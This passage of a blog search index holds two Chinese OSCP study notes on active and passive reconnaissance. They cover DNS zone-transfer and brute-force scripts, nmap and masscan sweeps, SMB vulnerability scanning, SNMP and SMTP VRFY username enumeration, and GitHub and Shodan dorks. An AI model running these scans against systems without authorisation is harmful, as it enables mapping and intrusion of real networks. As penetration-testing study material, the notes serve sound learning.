<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OSCP-主动式信息收集</title>
      <link href="2021/02/18/OSCP-%E4%B8%BB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/02/18/OSCP-%E4%B8%BB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h1><blockquote><p><strong>端口扫描</strong>   <strong>DNS枚举</strong>    <strong>SMB枚举</strong>  <strong>NFS枚举</strong>   <strong>SMTP枚举</strong>   <strong>SNMP枚举</strong></p></blockquote><h1 id="一：DNS-枚举"><a href="#一：DNS-枚举" class="headerlink" title="一：DNS 枚举"></a>一：DNS 枚举</h1><h4 id="1-DNS解析记录类型详解"><a href="#1-DNS解析记录类型详解" class="headerlink" title="1. DNS解析记录类型详解"></a>1. DNS解析记录类型详解</h4><table><thead><tr><th>记录类型</th><th>描述</th></tr></thead><tbody><tr><td>A记录</td><td>将域名指向一个IPV4地址(例如：10.10.10.10)</td></tr><tr><td>CNAME记录</td><td>如果将域名指向一个域名，实现与被指向域名相同的访问效果</td></tr><tr><td>MX记录</td><td>建立电子邮箱服务，将指向邮件服务器地址</td></tr><tr><td>NS记录</td><td>域名解析服务器记录，如果要将子域名指定某个域名服务器来解析</td></tr><tr><td>TXT记录</td><td>可任意填写（可为空），通常用做SPF记录（反垃圾邮件）使用</td></tr><tr><td>AAAA记录</td><td>将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1）</td></tr><tr><td>SRV记录</td><td>记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）</td></tr><tr><td>显性URL</td><td>将域名指向一个http（s)协议地址，访问域名时，自动跳转至目标地址（例如：将<a href="http://www.flao.cn显性转发到www.laosec.cn后，访问www.falao.cn时，地址栏显示的地址为：www.laosec.net）">www.flao.cn显性转发到www.laosec.cn后，访问www.falao.cn时，地址栏显示的地址为：www.laosec.net）</a></td></tr><tr><td>隐形URL</td><td>与显性URL类似，但隐性转发会隐藏真实的目标地址（例如：将<a href="http://www.falao.cn隐性转发到www.laosec.cn后，访问www.falao.cn时，地址栏显示的地址仍然为：www.laosec.cn）">www.falao.cn隐性转发到www.laosec.cn后，访问www.falao.cn时，地址栏显示的地址仍然为：www.laosec.cn）</a></td></tr></tbody></table><h4 id="2-Host命令"><a href="#2-Host命令" class="headerlink" title="2. Host命令"></a>2. Host命令</h4><blockquote><p>把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-a</td><td>等价于使用”-v -t”</td></tr><tr><td>-c Class</td><td>当搜索非网际数据时要指定查找的类</td></tr><tr><td>-d</td><td>打开调试方式</td></tr><tr><td>-n</td><td>等价于发布/usr/bin/hostnew命令.hostnew命令是host命令的5.2版本</td></tr><tr><td>-r</td><td>禁用递归处理</td></tr><tr><td>-t Type</td><td>指定要查询的记录类型</td></tr><tr><td>-v</td><td>详细方式</td></tr><tr><td>-w</td><td>永远等待 DNS服务器的一个回答</td></tr><tr><td>-z</td><td>使用显示资源记录信息的新输出</td></tr></tbody></table><pre><code class="shell">host megacorpone.com   #默认查询A记录host -t txt megacorpone.com  #指定查找TXT记录</code></pre><h4 id="3-正向查找爆破"><a href="#3-正向查找爆破" class="headerlink" title="3. 正向查找爆破"></a>3. 正向查找爆破</h4><pre><code class="shell">┌──(root💀kali)-[~]└─# cat list.txtwwwftpmailowaproxytouter                                                                                            ┌──(root💀kali)-[~]└─# for ip in $(cat list.txt); do host $ip.laosec.cn; donewww.laosec.cn is an alias for laosec.github.io.laosec.github.io has address 185.199.111.153laosec.github.io has address 185.199.108.153laosec.github.io has address 185.199.109.153laosec.github.io has address 185.199.110.153Host ftp.laosec.cn not found: 3(NXDOMAIN)Host mail.laosec.cn not found: 3(NXDOMAIN)Host owa.laosec.cn not found: 3(NXDOMAIN)Host proxy.laosec.cn not found: 3(NXDOMAIN)Host touter.laosec.cn not found: 3(NXDOMAIN)┌──(root💀kali)-[~]└─# apt install seclists  #安装字典                                                                                                                                                     ┌──(root💀kali)-[~]└─# cd /usr/share/seclists/  #字典存放路径                                                                                     ┌──(root💀kali)-[/usr/share/seclists]└─# ls  Discovery  IOCs           Passwords         Payloads   UsernamesFuzzing    Miscellaneous  Pattern-Matching  README.md  Web-Shells</code></pre><h4 id="4-反向查找爆破"><a href="#4-反向查找爆破" class="headerlink" title="4. 反向查找爆破"></a>4. 反向查找爆破</h4><pre><code class="shell">┌──(root💀kali)-[/usr/share/seclists/Fuzzing]└─# for ip in $(seq 100 200); do host 185.199.108.$ip; done | grep -v "no servers" </code></pre><h4 id="5-DNS区域传输"><a href="#5-DNS区域传输" class="headerlink" title="5. DNS区域传输"></a>5. DNS区域传输</h4><blockquote><p>区域传输基本上是在区域所在的相关DNS服务器之间进行的数据库复制文件从主DNS服务器复制到从服务器。区域文件包含所有DNS的列表为该区域配置的名称。区域传输应该只允许被授权的从属DNS但是许多管理员错误地配置了他们的DNS服务器，在这种情况下，任何人对于DNS服务器区域的副本，通常会收到一个。这相当于把公司网络布局交给黑客。所有的名字,服务器的地址和功能可能会被窥探.</p></blockquote><pre><code class="shell">kali#host -l &lt;domain name&gt; &lt;dns server address&gt;   #执行区域传输命令kali#host -l megacorpone.com nsl.megacorpone.com  #尝试区域传输┌──(root💀kali)-[~]└─# host -l laosec.cn dns25.hichina.comUsing domain server:Name: dns25.hichina.comAddress: 106.11.211.59#53Aliases: ; Transfer failed.kali#host -l megacorpone.com ns2.megacorpone.comUsing domain server:Name: ns2.megacorpone.comAddress: 38.100,193.80#53Aliases:megacorpone.com name server nsl.megacorpone.com.megacorpone.com name server ns2.megacorpone.com.megacorpone.com name server ns3.megacorpone.com.admin.megacorpone.com has address 38.100.193.83beta.megacorpone.com has address 38.100.193.88fsl.megacorpone.com has address 38.100. 193.82 #此服务器允许区域传输，并为用户提供区域文件的完整转储themegacorpone.com域，提供一个方便的IP地址和相应的DNS主机列表！</code></pre><blockquote><p>要使用host命令尝试区域传输，我们需要两个参数：DNS服务器地址和域名。我们可以使用以下命令获取给定域的名称服务器：</p></blockquote><pre><code class="shell">┌──(root💀kali)-[~]└─# host -t ns megacorpone.com | cut -d " " -f 4ns3.megacorpone.com.ns1.megacorpone.com.ns2.megacorpone.com.</code></pre><ul><li>编写一个Bash脚本来自动识别相关名称服务器并尝试从每个名称服务器进行区域传输</li></ul><pre><code class="shell">#!/bin/bashif [ -z "$1" ] ;   then        echo "[*] Simple Zone Transfer Scritp"        echo "[*] Usage:$0 &lt;dimain name&gt;"fifor server in $(host -t ns $1 | cut -d " " -f 4);do        host -l $1 $server | grep "has address"   done</code></pre><pre><code class="shell">┌──(root💀kali)-[~]└─# ./dns-axfr.sh megacorpone.com                                       admin.megacorpone.com has address 51.222.169.208beta.megacorpone.com has address 51.222.169.209fs1.megacorpone.com has address 51.222.169.210intranet.megacorpone.com has address 51.222.169.211mail.megacorpone.com has address 51.222.169.212mail2.megacorpone.com has address 51.222.169.213...</code></pre><h4 id="6-Kali-Linux中相关工具"><a href="#6-Kali-Linux中相关工具" class="headerlink" title="6. Kali Linux中相关工具"></a>6. Kali Linux中相关工具</h4><h5 id="1-DNSRecon"><a href="#1-DNSRecon" class="headerlink" title="1:)DNSRecon"></a>1:)DNSRecon</h5><blockquote><p>DNSRecon是用Python编写的DNS枚举脚本。运行dnsrecon megacorpone.com使用-d选项指定域名，使用-t指定要执行的枚举类型,将生成以下输出：</p></blockquote><pre><code class="shell">┌──(root💀kali)-[~]└─# dnsrecon -d megacorpone.com -t axfr  #通过指定AXFR的type能够请求一个区域传输[*] Testing NS Servers for Zone Transfer[*] Checking for Zone Transfer for megacorpone.com name servers[*] Resolving SOA Record['SOA', 'ns1.megacorpone.com', '51.79.37.18'][+]      SOA ns1.megacorpone.com 51.79.37.18[*] Resolving NS Records[*] NS Servers found:[*]     NS ns3.megacorpone.com 66.70.207.180[*]     NS ns1.megacorpone.com 51.79.37.18[*]     NS ns2.megacorpone.com 51.222.39.63[*] Removing any duplicate NS server IP Addresses...[*]  [*] Trying NS server 51.222.39.63[+] [['NS', 'ns3.megacorpone.com', '66.70.207.180'], ['NS', 'ns1.megacorpone.com', '51.79.37.18'], ['NS', 'ns2.megacorpone.com', '51.222.39.63']] Has port 53 TCP Open[+] Zone Transfer was successful!![*]      NS ns1.megacorpone.com 51.79.37.18[*]      NS ns2.megacorpone.com 51.222.39.63[*]      NS ns3.megacorpone.com 66.70.207.180[*]      TXT Try Harder[*]      TXT google-site-verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA[*]      MX @.megacorpone.com fb.mail.gandi.net 217.70.178.216[*]      MX @.megacorpone.com fb.mail.gandi.net 217.70.178.217[*]      MX @.megacorpone.com spool.mail.gandi.net 217.70.178.1[*]      A admin.megacorpone.com 51.222.169.208[*]      A beta.megacorpone.com 51.222.169.209[*]      A fs1.megacorpone.com 51.222.169.210[*]      A intranet.megacorpone.com 51.222.169.211[*]      A mail.megacorpone.com 51.222.169.212[*]      A mail2.megacorpone.com 51.222.169.213[*]      A ns1.megacorpone.com 51.79.37.18[*]      A ns2.megacorpone.com 51.222.39.63[*]      A ns3.megacorpone.com 66.70.207.180[*]      A router.megacorpone.com 51.222.169.214[*]      A siem.megacorpone.com 51.222.169.215[*]      A snmp.megacorpone.com 51.222.169.216[*]      A support.megacorpone.com 51.222.169.218[*]      A syslog.megacorpone.com 51.222.169.217[*]      A test.megacorpone.com 51.222.169.219[*]      A vpn.megacorpone.com 51.222.169.220[*]      A www.megacorpone.com 149.56.244.87[*]      A www2.megacorpone.com 149.56.244.87...┌──(root💀kali)-[~]└─# dnsrecon -d megacorpone.com -D /root/list.txt -t brt[*] Performing host and subdomain brute force against megacorpone.com[+] www.megacorpone.com: A : 149.56.244.87[+] mail.megacorpone.com: A : 51.222.169.212[+] 2 Records Found#-d指定域名 -D指定爆破文件名 -t brt 指定破解方式为暴力破解</code></pre><h5 id="2-DNSEnum"><a href="#2-DNSEnum" class="headerlink" title="2:)DNSEnum"></a>2:)DNSEnum</h5><pre><code class="shell">┌──(root💀kali)-[~]└─# dnsenum laosec.cn                                                                    130 ⨯dnsenum VERSION:1.2.6-----   laosec.cn   -----Host's addresses:__________________laosec.cn.                               30       IN    A        185.199.108.153Name Servers:______________dns25.hichina.com.                       1173     IN    A        106.11.141.119dns25.hichina.com.                       1173     IN    A        140.205.41.19</code></pre><h5 id="3-Exercises"><a href="#3-Exercises" class="headerlink" title="3:)Exercises"></a>3:)Exercises</h5><ul><li>查找megacorpone.com域的DNS服务器</li><li>编写脚本,尝试从megacorpone.com使用更高级的脚本语言，如Python、Perl或Ruby。</li></ul><h1 id="二：端口扫描"><a href="#二：端口扫描" class="headerlink" title="二：端口扫描"></a>二：端口扫描</h1><blockquote><p>端口扫描是检查远程机器上的TCP或UDP端口的过程，目的是检测目标上正在运行的服务以及可能存在的潜在攻击面还必须了解端口扫描的含义，以及特定端口扫描可能产生的影响。由于某些扫描可能产生的通信量及其侵入性，盲目运行端口扫描可能会对目标系统或客户端网络产生不利影响，例如服务器和网络链接过载或触发IDS。运行错误的扫描可能会导致客户停机</p></blockquote><h4 id="1-TCP-UDP端口扫描"><a href="#1-TCP-UDP端口扫描" class="headerlink" title="1. TCP/UDP端口扫描"></a>1. TCP/UDP端口扫描</h4><ul><li>TCP扫描</li></ul><pre><code class="shell">┌──(root💀kali)-[~]└─# nc -nvv -w 1 -z 192.168.50.238 3388-3390# -w 指定连接超时时间，以秒为单位# -z 3388-3390 指定扫描模式将不会发送数据</code></pre><ul><li>UDP扫描</li></ul><pre><code class="shell">┌──(root💀kali)-[~]└─# nc -nv -u -z -w 1 192.168.50.238 160-162(UNKNOWN) [192.168.50.238] 162 (snmp-trap) open(UNKNOWN) [192.168.50.238] 161 (snmp) open# -u 表示使用UDP扫描</code></pre><h4 id="2-使用Nmap扫描"><a href="#2-使用Nmap扫描" class="headerlink" title="2. 使用Nmap扫描"></a>2. 使用Nmap扫描</h4><ul><li>设置靶机</li></ul><pre><code class="shell">Centos6#iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPTCentos6#iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPTCentos6#iptables -ZCentos6#iptables -vn -L# -I 插入一条规则 -Z清空# -s 源地址 -d 目的地址# -j 指定动作#-L 显示规则  -v 显示详细信息 -n 启用数字输出</code></pre><ul><li>Kali扫描</li></ul><pre><code class="shell">Kali#nmap 10.11.1.220Kali#nmap -p 1-65535 10.11.1.220 #指定端口扫描Kali#nmap -sS 10.11.1.220   #SYN扫描Kali#nmap -sT 10.11.1.220   #TCP扫描Kali#nmap -sU 10.11.1.220   #UDP扫描Kali#nmap -sS -sU 10.11.1.220   #SYN扫描与UDP扫描Kali#nmap -sn 10.11.1.220   #ping扫描Kali#nmap -v -sn 10.11.1.220-250 -oG ping-sweep.txt  #-n 不做DNS解析 -oG 输出保存结果kali#grep Up ping-sweep.txt | cut -d " " -f 2 #将存活主机的IP地址显示出来Kali#nmap -p 80 10.11.1.220-250 -oG web-sweep.txt #扫描局域网中指定开放的端口，并将其结果保存Kali#grep open web-sweep.txt | cut -d " " -f 2 #将开放80端口的主机显示出来Kali#nmap -sT -A -top-port=20 10.11.1.1-254 -oG top-port-sweep.txt#对指定网段主机进行TCP扫描，扫描流行端口的前20个并进行详细的扫描，将其扫描结果导出Kali#nmap -O 10.11.1.220 #系统指纹识别Kali#nmap -sV -sT -A 10.11.1.220 # -sV 探测开启的端口来获取服务与版本信息Kali#nmap 10.11.1.220 --script=smb-os-discovery #--script=脚本.nse  启用脚本扫描Kali#nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com #使用脚本扫描目标DNS服务其是否存在区域传输漏洞Kali#nmap --script-help dns-zone-transfer #查看NSE脚本的帮助信息#kali中加载的脚本存储地方位于/usr/share/nmap/scripts/</code></pre><blockquote><p>前20个nmap端口是使用/usr/share/nmap/services服务文件确定的.文件使用由三个空格分隔的列组成的简单格式.第一个是服务的名称,第二个包含端口号和协议,第三个包含“端口频率”.第三列被忽略，但通常用于注释，可以通过使用（#）</p></blockquote><pre><code class="shell">┌──(root💀kali)-[~]└─# more /usr/share/nmap/nmap-services 50...tcpmux  1/udp   0.001236        # TCP Port Service Multiplexercompressnet     2/tcp   0.000013        # Management Utilitycompressnet     2/udp   0.001845        # Management Utilitycompressnet     3/tcp   0.001242        # Compression Processcompressnet     3/udp   0.001532        # Compression Processunknown 4/tcp   0.000477rje     5/tcp   0.000000        # Remote Job Entryrje     5/udp   0.000593        # Remote Job Entry...</code></pre><h4 id="3-Exercises-1"><a href="#3-Exercises-1" class="headerlink" title="3. Exercises"></a>3. Exercises</h4><ul><li>使用Nmap对目标IP范围进行ping扫描，并将输出保存到文件中。使用grep显示联机的机器</li><li>在练习1中找到的IP地址以查找开放的80端口。使用Nmap查找Web服务器和操作系统版本</li><li>使用NSE脚本扫描实验室中运行SMB服务的机器</li><li>使用Wireshark捕获Nmap连接和UDP扫描，并将其与Netcat进行比较端口扫描。查看异同点</li><li>使用Wireshark捕获Nmap SYN扫描，并将其与连接扫描进行比较，找出两者的差异</li></ul><h4 id="4-Masscan"><a href="#4-Masscan" class="headerlink" title="4. Masscan"></a>4. Masscan</h4><blockquote><p>Masscan可以说是最快的端口扫描仪；它可以在大约6分钟内扫描整个互联网。每秒传送惊人的1百万个数据包！虽然它最初设计用于扫描整个互联网，但它可以轻松处理a类或B类子网。</p></blockquote><pre><code class="shell">┌──(root💀kali)-[~]└─# apt install masscan┌──(root💀kali)-[~]└─# masscan                              usage:masscan -p80,8000-8100 10.0.0.0/8 --rate=10000 scan some web ports on 10.x.x.x at 10kppsmasscan --nmap list those options that are compatible with nmapmasscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt; save results of scan in binary format to &lt;filename&gt;masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt; read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;</code></pre><pre><code class="shell">Kali#masscan -p80 10.0.0.0/8  #扫描该网段中所有开放80端口的主机kali#masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip=10.11.0.1#--rate=1000 指定数据包的传输速率#-e eth0 指定要使用的网络接口#--router-ip=10.11.0.1 指定网关的IP地址┌──(root💀kali)-[~]└─# masscan -p80 192.168.50.0/24 --rate=1000 -e eth0 --router-ip=192.168.50.1Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-02-19 05:42:01 GMTInitiating SYN Stealth ScanScanning 256 hosts [1 port/host]Discovered open port 80/tcp on 192.168.50.117 //web靶场                                 Discovered open port 80/tcp on 192.168.50.1   //网关地址                                 Discovered open port 80/tcp on 192.168.50.11  //发卡网站                                 Discovered open port 80/tcp on 192.168.50.75  //打印机地址</code></pre><h1 id="三：SMB枚举"><a href="#三：SMB枚举" class="headerlink" title="三：SMB枚举"></a>三：SMB枚举</h1><h4 id="1-扫描NetBIOS服务"><a href="#1-扫描NetBIOS服务" class="headerlink" title="1. 扫描NetBIOS服务"></a>1. 扫描NetBIOS服务</h4><pre><code class="shell">┌──(root💀kali)-[~]└─# nmap -v -p 139,445 -oG smb.txt 192.168.50.0/24┌──(root💀kali)-[~]└─# nbtscan -r 192.168.50.0/24  # -r用于将原始UDP端口指定为137，用于查询NetBIOS名称服务以获取有效的NetBIOS名称┌──(root💀kali)-[~]└─# nmap -v -p 139,445 --script=smb-os-discovery 192.168.50.0/24 ...Nmap scan report for WIN-21R91UAPPRF (192.168.50.118)Host is up (0.031s latency).PORT    STATE SERVICE139/tcp open  netbios-ssn445/tcp open  microsoft-dsMAC Address: 34:F3:9A:68:AF:60 (Intel Corporate)Host script results:| smb-os-discovery: |   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: WIN-21R91UAPPRF|   NetBIOS computer name: WIN-21R91UAPPRF\x00|   Workgroup: WorkGroup\x00|_  System time: 2021-02-19T13:59:01+08:00...┌──(root💀kali)-[~]└─# nmap -v -p 139,445 --script=smb-vuln-*.nse --script-args=unsage=1 192.168.50.118#探测目标主机是否存在漏洞 unsafe可能会对系统有伤害,导致宕机,但要比safe准确</code></pre><h4 id="2-Exercises"><a href="#2-Exercises" class="headerlink" title="2. Exercises"></a>2. Exercises</h4><ul><li>使用Nmap列出局域网中运行Windows的SMB服务器</li><li>使用NSE脚本扫描这些系统中的SMB漏洞</li><li>对这些系统使用nbtscan和enum4linux来标识您可以从不同版本的Windows中获得的数据类型</li></ul><h1 id="四：NFS枚举"><a href="#四：NFS枚举" class="headerlink" title="四：NFS枚举"></a>四：NFS枚举</h1><h4 id="1-扫描NFS共享"><a href="#1-扫描NFS共享" class="headerlink" title="1. 扫描NFS共享"></a>1. 扫描NFS共享</h4><pre><code class="shell">kali#nmap -v -p 111 10.11.1.1-254kali#nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254  #使用脚本来查找可能已经在rpcbind中注册的服务kali#nmap -p 111 --script=nfs* 10.11.1.72 #调用所有nfs相关的脚本通过*来匹配</code></pre><h4 id="2-入侵NFS共享"><a href="#2-入侵NFS共享" class="headerlink" title="2. 入侵NFS共享"></a>2. 入侵NFS共享</h4><h4 id="3-Exercises-2"><a href="#3-Exercises-2" class="headerlink" title="3. Exercises"></a>3. Exercises</h4><ul><li>使用Nmap列出当前环境中运行NFS的机器</li><li>使用NSE脚本扫描这些系统并收集有关可访问共享的附加信息</li></ul><h1 id="五：SMTP枚举"><a href="#五：SMTP枚举" class="headerlink" title="五：SMTP枚举"></a>五：SMTP枚举</h1><pre><code class="shell">kali# nc -nv 10.11.1.211 25 </code></pre><h4 id="1-SMTP测试脚本"><a href="#1-SMTP测试脚本" class="headerlink" title="1. SMTP测试脚本"></a>1. SMTP测试脚本</h4><pre><code class="python">#!/usr/bin/python import socket   #导入网络套接字库import sys      #导入sys库if len(sys.argv) != 2:   #判断传入参数值    print "Usage: vrfy.py &lt;username&gt;"  #输出使用方式    sys.exit((0))    #退出程序  # Create a Sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #创建socket套接字# Connect to the Serverconnect= s.connect(("10.1.1.127",25))# Receive the banne banner= s.recv(l024)print banner# VRFY a users.send('VRFY ' + sys.argv[l] + '\r\n')result= s.recv(l024)print result# Close the sockets.close()</code></pre><h4 id="2-Exercises-1"><a href="#2-Exercises-1" class="headerlink" title="2. Exercises"></a>2. Exercises</h4><ul><li>搜索您的目标网络范围，查看是否可以识别任何响应SMTP VRFY命令的系统。</li><li>尝试使用这个Python代码，使用一个以用户名作为输入的文本文件来自动执行用户名发现过程</li></ul><h1 id="六：SNMP枚举"><a href="#六：SNMP枚举" class="headerlink" title="六：SNMP枚举"></a>六：SNMP枚举</h1><h4 id="1-SNMP扫描"><a href="#1-SNMP扫描" class="headerlink" title="1. SNMP扫描"></a>1. SNMP扫描</h4><pre><code class="shell">kali#nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt # --open 只显示开放的端口kali@kali:~$ echo public &gt; communitykali@kali:~$ echo private&gt;&gt; communitykali@kali:-$ echo manager &gt;&gt; communitykali@kali:~$ for ip in $(seq 1 2S4); do echo 10.ll.1.$ip; done &gt; ipskali@kali:~$ onesixtyone - c community -i ips </code></pre><blockquote><p>我们可以使用snmpwalk之类的工具来探测和查询SNMP值，前提是我们至少知道SNMP只读字符串，在大多数情况下它是“public”</p></blockquote><ul><li><p>枚举MIB树</p><pre><code class="shell">kali#snmpwalk -c public -v1 -t 10 10.11.1.14 # -c 指定字符串 -v 指定SNMP版本号 -t 10 设置超时时间为10秒</code></pre></li><li><p>枚举windows用户</p><pre><code class="shell">kali#snmpwalk -c public -v1 10.11..1.14 1.3.6.1.4.77.1.2.25</code></pre></li><li><p>枚举正在运行的windows进程</p><pre><code class="shell">kali#snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2</code></pre></li><li><p>枚举开放的TCP端口</p><pre><code class="shell">kali#snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3</code></pre></li><li><p>枚举安装的软件</p><pre><code class="shell">kali#snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2</code></pre></li></ul><h4 id="2-Exercises-2"><a href="#2-Exercises-2" class="headerlink" title="2. Exercises"></a>2. Exercises</h4><ul><li>用onesixtyone扫描目标网络以识别任何SNMP服务器</li><li>使用snmpwalk和snmp check收集有关发现的目标的信息</li></ul><p><span class="github-emoji"><span>🐆</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f406.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> 计算机认证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-被动式信息收集</title>
      <link href="2021/02/18/OSCP-%E8%A2%AB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/02/18/OSCP-%E8%A2%AB%E5%8A%A8%E5%BC%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h1><blockquote><p>被动式信息收集，不与目标产生任何交互</p></blockquote><h1 id="whois枚举"><a href="#whois枚举" class="headerlink" title="whois枚举"></a>whois枚举</h1><ul><li><p>正向查找</p><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ whois megacorpone.com                                                                </code></pre></li><li><p>反向查找</p><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ whois 38.100.193.70  </code></pre></li></ul><h1 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h1><ul><li>谷歌语法</li></ul><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>intext:关键字</td><td>搜索网页正文中含有这些关键字的网页</td></tr><tr><td>intitle:关键字</td><td>搜索网页标题中含有这些关键字的网页</td></tr><tr><td>cache:关键字</td><td>搜索含有关键字内容的cache</td></tr><tr><td>define:搜索关键字的定义</td><td>搜索关键字的定义</td></tr><tr><td>filtetyp:文件名.后缀名</td><td>搜索特定的文件</td></tr><tr><td>info:关键字</td><td>搜索指定站点的一些基本信息</td></tr><tr><td>inurl:关键字</td><td>搜索含有关键字的URL地址</td></tr><tr><td>link:关键字</td><td>查找与关键字做了链接的URL地址</td></tr><tr><td>site:域名</td><td>返回域名中所有的URL地址</td></tr></tbody></table><ul><li><a href="https://www.exploit-db.com/google-hacking-database">GHDB</a></li></ul><h1 id="Netcraft"><a href="#Netcraft" class="headerlink" title="Netcraft"></a>Netcraft</h1><ul><li><a href="https://searchdns.netcraft.com/">Netcraft </a></li></ul><p><img src="https://s3.ax1x.com/2021/02/18/yWG9X9.png"></p><h1 id="Recon-ng"><a href="#Recon-ng" class="headerlink" title="Recon-ng"></a>Recon-ng</h1><blockquote><p><strong>recon-ng是一款强大的信息收集工具，特别是在收集子域名以及解析子域名的IP地址时，十分方便</strong></p></blockquote><pre><code class="shell">┌──(laosec㉿kali)-[~]└─$ recon-ng                                                                             127 ⨯[*] Version check disabled.    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/         _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/ _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ _/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/                                              /\                                         / \\ /\    Sponsored by...               /\  /\/  \\V  \/\                                 / \\/ // \\\\\ \\ \/\                                // // BLACK HILLS \/ \\                               www.blackhillsinfosec.com                  ____   ____   ____   ____ _____ _  ____   ____  ____                 |____] | ___/ |____| |       |   | |____  |____ |                 |      |   \_ |    | |____   |   |  ____| |____ |____                                   www.practisec.com                      [recon-ng v5.1.1, Tim Tomes (@lanmaster53)]                       [*] No modules enabled/installed.[recon-ng][default] &gt; </code></pre><pre><code class="shell">[recon-ng][default] &gt; marketplace search github    #搜索相关模块[recon-ng][default] &gt; marketplace info recon/domains-hosts/google_site_web   #查看模块详细信息[recon-ng][default] &gt; marketplace install recon/domains-hosts/google_site_web  #安装模块[recon-ng][default] &gt; modules load recon/domains-hosts/google_site_web    #进入此模块[recon-ng][default][google_site_web] &gt; info       #查看模块相关信息[recon-ng][default][google_site_web] &gt; options set SOURCE laosec.cn   #根据模块信息来设置相关参数[recon-ng][default][google_site_web] &gt; run        #运行模块[recon-ng][default][google_site_web] &gt; show hosts #查看存储的结果数据[recon-ng][default][google_site_web] &gt; back       #退出当前模块[recon-ng][default] &gt; marketplace info recon/hosts-hosts/resolve     #查看模块的详细信息--&gt;解析主机的IP地址[recon-ng][default] &gt; marketplace install recon/hosts-hosts/resolve  #安装模块[recon-ng][default] &gt; modules load recon/hosts-hosts/resolve    #加载模块[recon-ng][default][resolve] &gt; info   #查看模块的详细信息[recon-ng][default][resolve] &gt; run    #执行此模块[recon-ng][default][resolve] &gt; show hosts  #查看存储的结果所对应的IP地址</code></pre><h1 id="开源代码"><a href="#开源代码" class="headerlink" title="开源代码"></a>开源代码</h1><blockquote><p>开源项目或在线代码存储库：Github /Gitlab/SourceForge</p></blockquote><pre><code class="http">user:megacorpone filename:users   //user:github用户名  filename:敏感文件名</code></pre><p><img src="https://s3.ax1x.com/2021/02/18/yWrm3n.png"></p><p><img src="https://s3.ax1x.com/2021/02/18/yWrdu6.png"></p><h1 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h1><blockquote><p>在线设备搜索引擎<a href="https://www.shodan.io/">Shodan</a></p></blockquote><pre><code class="shell">hostname:megacorpone.com      hostname:megacorpone.com port:22 </code></pre><h1 id="Security-Header-Scanner"><a href="#Security-Header-Scanner" class="headerlink" title="Security Header Scanner"></a>Security Header Scanner</h1><ul><li><a href="https://securityheaders.com/">https://securityheaders.com/</a></li></ul><h1 id="SSL-Server-Test"><a href="#SSL-Server-Test" class="headerlink" title="SSL Server Test"></a>SSL Server Test</h1><blockquote><p>SSL服务器测试</p></blockquote><ul><li><a href="https://www.ssllabs.com/">https://www.ssllabs.com/</a></li></ul><h1 id="Pastebin"><a href="#Pastebin" class="headerlink" title="Pastebin"></a>Pastebin</h1><blockquote><p>Pastebin是一个用于存储和共享文本的网站。该网站不需要基本的帐户。许多人使用Pastebin是因为它无处不在，而且使用简单。但既然Pastebin是一个公共服务，我们可以用它来搜索敏感信息。</p></blockquote><ul><li><a href="http://pastebin.com/">http://pastebin.com/</a></li></ul><h1 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h1><pre><code class="shell">┌──(root💀kali)-[~]└─# theharvester -d megacorpone.com -b google # -d 指定目标域 -b 设置数据要搜索的源</code></pre><h1 id="密码存储"><a href="#密码存储" class="headerlink" title="密码存储"></a>密码存储</h1><pre><code class="shell">/usr/share/wordlists/rockyou.txt</code></pre><h1 id="社交媒体工具"><a href="#社交媒体工具" class="headerlink" 